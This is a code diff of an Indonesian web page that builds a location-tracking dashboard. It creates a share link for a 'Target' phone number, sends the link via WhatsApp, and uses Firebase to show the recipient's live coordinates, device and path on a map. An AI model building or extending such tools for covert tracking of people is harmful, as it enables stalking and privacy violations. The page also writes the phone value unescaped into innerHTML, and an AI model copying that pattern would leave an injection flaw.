@@ -8,7 +8,6 @@
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 </head>
 <body>
-  <!-- Notifikasi Berhasil / Gagal -->
   <div id="notifBanner" class="notif hidden" role="status" aria-live="polite">
     <span id="notifText"></span>
     <button type="button" id="notifClose" class="notif-close" aria-label="Tutup">&times;</button>
@@ -116,89 +115,117 @@
   </div>
 
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-  <script>
-    document.addEventListener("DOMContentLoaded", function () {
-      const phoneInput = document.getElementById("phoneInput");
-      const createBtn = document.getElementById("createLinkBtn");
-      const shareLinkInput = document.getElementById("shareLink");
-      const copyBtn = document.getElementById("copyBtn");
-      const waBtn = document.getElementById("waBtn");
-      const statusText = document.getElementById("statusText");
-      const topStatus = document.getElementById("topStatus");
-      const notifBanner = document.getElementById("notifBanner");
-      const notifText = document.getElementById("notifText");
-      const notifClose = document.getElementById("notifClose");
+  <script type="module">
+    import { db } from "./js/firebase-config.js";
+    import { ref, set, onValue } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
-      function showNotif(msg, type) {
-        if (!notifBanner || !notifText) return;
-        notifText.textContent = msg;
-        notifBanner.className = "notif " + (type || "success");
+    const phoneInput = document.getElementById("phoneInput");
+    const createBtn = document.getElementById("createLinkBtn");
+    const shareLinkInput = document.getElementById("shareLink");
+    const copyBtn = document.getElementById("copyBtn");
+    const waBtn = document.getElementById("waBtn");
+    const statusText = document.getElementById("statusText");
+    const topStatus = document.getElementById("topStatus");
+    const coordBadge = document.getElementById("coordBadge");
+    const connState = document.getElementById("connState");
+    const teleCoords = document.getElementById("teleCoords");
+    const teleAccuracy = document.getElementById("teleAccuracy");
+    const teleDevice = document.getElementById("teleDevice");
+    const teleUpdated = document.getElementById("teleUpdated");
+    const notifBanner = document.getElementById("notifBanner");
+    const notifText = document.getElementById("notifText");
+    const notifClose = document.getElementById("notifClose");
+
+    let map, marker, polyline, unsub = null;
+
+    function showNotif(msg, type = "success") {
+      if (!notifBanner || !notifText) return;
+      notifText.textContent = msg;
+      notifBanner.className = "notif " + type;
+    }
+
+    notifClose?.addEventListener("click", () => notifBanner?.classList.add("hidden"));
+
+    if (document.getElementById("map") && typeof L !== "undefined") {
+      map = L.map("map").setView([-6.2, 106.8166], 12);
+      L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
+        attribution: "&copy; OpenStreetMap"
+      }).addTo(map);
+      polyline = L.polyline([], { color: "#00e5ff", weight: 4 }).addTo(map);
+    }
+
+    function startWatch(sessionId, phone) {
+      if (typeof unsub === "function") unsub();
+      unsub = onValue(ref(db, "sessions/" + sessionId), (snap) => {
+        const data = snap.val();
+        if (!data) return;
+
+        if (statusText) {
+          statusText.innerHTML = `Target: <b>${phone}</b> | Status: <b>${data.status || "Aktif"}</b>`;
+        }
+        if (connState && (data.connected || typeof data.lat === "number")) {
+          connState.textContent = "Terhubung";
+          connState.className = "conn-badge online";
+          if (topStatus) topStatus.textContent = "Live";
+        }
+        if (teleDevice && data.device) teleDevice.textContent = data.device;
+        if (teleUpdated && data.updatedAt) {
+          teleUpdated.textContent = new Date(data.updatedAt).toLocaleTimeString("id-ID");
+        }
+        if (typeof data.lat === "number" && typeof data.lng === "number") {
+          const latStr = data.lat.toFixed(6);
+          const lngStr = data.lng.toFixed(6);
+          if (coordBadge) coordBadge.textContent = `Lat: ${latStr} | Lng: ${lngStr}`;
+          if (teleCoords) teleCoords.textContent = `${latStr}, ${lngStr}`;
+          if (teleAccuracy && typeof data.accuracy === "number") {
+            teleAccuracy.textContent = `±${Math.round(data.accuracy)} m`;
+          }
+          if (map) {
+            const pos = [data.lat, data.lng];
+            if (!marker) marker = L.marker(pos).addTo(map);
+            else marker.setLatLng(pos);
+            polyline?.addLatLng(pos);
+            map.setView(pos, 16);
+          }
+        }
+      });
+    }
+
+    createBtn?.addEventListener("click", async () => {
+      const phone = (phoneInput?.value || "").trim();
+      if (!phone) {
+        showNotif("Gagal: Masukkan nomor HP dulu!", "error");
+        return;
       }
 
-      if (notifClose && notifBanner) {
-        notifClose.addEventListener("click", function () {
-          notifBanner.classList.add("hidden");
+      const sessionId = "vx_" + Date.now().toString(36) + "_" + Math.random().toString(36).substring(2, 6);
+      const baseDir = window.location.pathname.replace(/[^/]*$/, "");
+      const link = `${window.location.origin}${baseDir}share.html?session=${sessionId}`;
+      if (shareLinkInput) shareLinkInput.value = link;
+
+      try {
+        await set(ref(db, "sessions/" + sessionId), {
+          phone,
+          status: "Menunggu Persetujuan",
+          createdAt: Date.now()
         });
+        if (statusText) statusText.innerHTML = `Target: <b>${phone}</b> | Status: Menunggu Persetujuan`;
+        showNotif("Berhasil! Tautan dibuat & tersimpan di database.", "success");
+        startWatch(sessionId, phone);
+      } catch (err) {
+        showNotif("Gagal simpan ke Firebase: " + (err?.message || err), "error");
       }
+    });
 
-      if (document.getElementById("map") && typeof L !== "undefined") {
-        const map = L.map("map").setView([-6.2, 106.8166], 12);
-        L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
-          attribution: "&copy; OpenStreetMap"
-        }).addTo(map);
-      }
+    copyBtn?.addEventListener("click", async () => {
+      if (!shareLinkInput?.value) return showNotif("Buat tautan dulu!", "error");
+      try { await navigator.clipboard.writeText(shareLinkInput.value); } catch {}
+      showNotif("Tautan disalin.", "success");
+    });
 
-      if (createBtn) {
-        createBtn.addEventListener("click", function () {
-          const phone = phoneInput ? phoneInput.value.trim() : "";
-          if (!phone) {
-            showNotif("Gagal: Masukkan nomor HP dulu!", "error");
-            return;
-          }
-
-          const sessionId = "vx_" + Math.random().toString(36).substring(2, 8);
-          const baseDir = window.location.pathname.replace(/[^/]*$/, "");
-          const link = window.location.origin + baseDir + "share.html?session=" + sessionId;
-
-          if (shareLinkInput) {
-            shareLinkInput.value = link;
-          }
-          if (topStatus) {
-            topStatus.textContent = "Tautan Siap";
-          }
-          if (statusText) {
-            statusText.innerHTML = "Target: <b>" + phone + "</b> | Status: Menunggu Persetujuan";
-          }
-
-          showNotif("Berhasil! Tautan berbagi lokasi sudah dibuat.", "success");
-        });
-      }
-
-      if (copyBtn && shareLinkInput) {
-        copyBtn.addEventListener("click", function () {
-          if (!shareLinkInput.value) {
-            showNotif("Gagal: Buat tautan dulu sebelum menyalin.", "error");
-            return;
-          }
-          if (navigator.clipboard && navigator.clipboard.writeText) {
-            navigator.clipboard.writeText(shareLinkInput.value).catch(function () {});
-          }
-          shareLinkInput.select();
-          try { document.execCommand("copy"); } catch (e) {}
-          showNotif("Berhasil! Tautan disalin.", "success");
-        });
-      }
-
-      if (waBtn && shareLinkInput) {
-        waBtn.addEventListener("click", function () {
-          if (!shareLinkInput.value) {
-            showNotif("Gagal: Buat tautan dulu sebelum kirim ke WA.", "error");
-            return;
-          }
-          const msg = encodeURIComponent("Buka tautan ini: " + shareLinkInput.value);
-          window.open("https://wa.me/?text=" + msg, "_blank");
-        });
-      }
+    waBtn?.addEventListener("click", () => {
+      if (!shareLinkInput?.value) return showNotif("Buat tautan dulu!", "error");
+      window.open("https://wa.me/?text=" + encodeURIComponent(shareLinkInput.value), "_blank");
     });
   </script>
 </body>
